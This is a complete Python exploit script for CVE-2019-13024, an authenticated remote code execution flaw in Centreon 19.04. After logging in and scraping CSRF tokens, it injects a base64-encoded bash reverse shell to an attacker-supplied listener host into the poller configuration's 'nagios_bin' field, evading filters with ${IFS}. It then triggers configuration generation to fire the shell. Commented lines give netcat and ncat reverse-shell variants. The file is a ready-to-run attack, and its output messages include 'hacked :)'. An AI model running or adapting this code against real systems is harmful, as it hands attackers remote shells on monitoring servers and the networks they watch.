import argparse
import requests
import sys
import base64
import lxml.html
import lxml.etree
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-13024
# Centreon v19.04 authenticated RCE
class CVE2019_13024:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    
    def __init__(self, url, user, pswd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.user, self.pswd = user, pswd
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()
    
    # get csrf token for login
    def get_csrf_token(self):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        r = self.session.get(self.url + "/index.php")
        tree = lxml.html.fromstring(r.text)
        csrf_token = tree.xpath('.//input[@name="centreon_token"]/@value')
        csrf_token = csrf_token[0]
        print (LogColors.YELLOW + "token: " + csrf_token + LogColors.ENDC)
        self.csrf_token = csrf_token

    # login
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        self.get_csrf_token()
        data = {
            "useralias" : self.user,
            "password" : self.pswd,
            "centreon_token" : self.csrf_token,
            "submitLogin" : "Connect",
        }
        r = self.session.post(self.url + "/index.php", data = data)
        if r.ok and "credentials are incorrect" not in r.text:
            print (LogColors.GREEN + "successfully login :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
            sys.exit()
    
    # get poller token from poller configuration page
    def get_poller_token(self):
        r = self.session.get(self.url + "/main.get.php?p=60901")
        page = r.text.lstrip('<?xml version="1.0" encoding="utf-8"?>').strip()
        tree = lxml.html.fromstring(page)
        csrf_token = tree.xpath('.//input[@name="centreon_token"]/@value')
        csrf_token = csrf_token[-1]
        print (LogColors.YELLOW + "poller token: " + csrf_token + LogColors.ENDC)
        self.csrf_token = csrf_token

    # send payload with rev shell
    def send_payload(self):
        print (LogColors.BLUE + "send payload..." + LogColors.ENDC)
        
        raw_payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.lhost, self.lport)
        raw_payload = base64.b64encode(bytes(raw_payload.encode('utf-8'))).decode()
        payload = "echo {}|base64 -d|bash;".format(raw_payload)
        payload = payload.replace(' ', '${IFS}')

        payload_data = {
            "name": "Central",
            "ns_ip_address": "127.0.0.1",
            "localhost[localhost]": "1",
            "is_default[is_default]": "0",
            "remote_id": "",
            "ssh_port": "22",
            "init_script": "centengine",
            "nagios_bin": "s; {}".format(payload), #"nc -e /bin/bash {0} {1} #".format(self.lhost, self.lport),
            #"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(self.lhost, self.lport),
            "nagiostats_bin": "/usr/sbin/centenginestats",
            "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
            "centreonbroker_cfg_path": "/etc/centreon-broker",
            "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
            "centreonbroker_logs_path": "",
            "centreonconnector_path": "/usr/lib64/centreon-connector",
            "init_script_centreontrapd": "centreontrapd",
            "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
            "ns_activate[ns_activate]": "1",
            "submitC": "Save",
            "id": "1",
            "o": "c",
            "centreon_token": self.csrf_token,
        }
        try:
            r = self.session.post(self.url + "/main.get.php?p=60901", data = payload_data)
        except Exception:
            print (LogColors.RED + "failed send payload. exit :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successful send payload. hacked :)" + LogColors.ENDC)
    
    # trigger shell
    def trigger_shell(self):
        print (LogColors.BLUE + "trigger shell..." + LogColors.ENDC)
        data = {
            "poller": "1",
            "debug": "true",
            "generate": "true",
        }
        try:
            r = self.session.post(
                self.url + "/include/configuration/configGenerate/xml/generateFiles.php",
                data = data, timeout = 5
            )
        except Exception:
            print (LogColors.RED + "failed trigger shell :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.GREEN + "successfully trigger rev shell. check nc :)" + LogColors.ENDC)

    # exploit step by step
    def exploit(self):
        self.login()
        self.get_poller_token()
        self.send_payload()
        self.trigger_shell()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-I','--lhost', required = True, help = "revshell listener host")
    parser.add_argument('-p','--lport', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    user, pswd = args['username'], args['password']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2019_13024(url, user, pswd, lhost, lport)
    cve.exploit()

